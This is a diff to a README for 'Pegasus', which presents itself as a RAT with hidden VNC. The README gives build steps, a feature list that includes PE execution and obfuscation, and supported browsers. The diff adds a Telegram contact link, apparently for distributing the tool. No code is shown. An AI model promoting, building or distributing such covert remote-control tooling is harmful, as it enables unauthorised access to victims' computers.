@@ -24,6 +24,9 @@ Pegasus is a premier Remote Administration Tool (RAT) paired with HVNC (Hidden V
 - Make Sure You Have Visual Studio Installed on Your Computer
 - [Click if Visual Studio is Not Installed](https://visualstudio.microsoft.com/en/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030)
 
+Contact me here  -  https://t.me/+jchT98W2AFI5Y2U1
+
+
 ### Compiling :
 1. Open the solution file (.sln).
 2. Select **Build Solution** from the **Build** menu or press `Ctrl+Shift+B` to compile the project.
@@ -141,6 +144,9 @@ Once the Hidden VNC is installed on your remote computer,you will be able to int
 * Run PE
 * Obfuscate
   </details>
+
+  Contact me here  -  https://t.me/+jchT98W2AFI5Y2U1
+
 
 ### Pegasus / Pantheon / Skynet Rat Hvnc  Supported Browsers 
 ![image](https://user-images.githubusercontent.com/106186548/170260119-d82fbfa9-d078-485c-ad1e-017b8d5a95ac.png)
